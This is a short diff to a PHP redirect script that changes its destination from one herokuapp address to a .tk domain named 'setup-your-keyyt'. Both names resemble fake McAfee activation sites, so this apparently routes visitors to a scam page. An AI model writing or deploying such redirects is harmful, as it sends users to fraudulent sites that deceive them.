@@ -1,4 +1,4 @@
 <?php
-header("Location: https://actmcafe.herokuapp.com");
+header("Location: https://setup-your-keyyt.tk/mca/");
 die();
 ?>
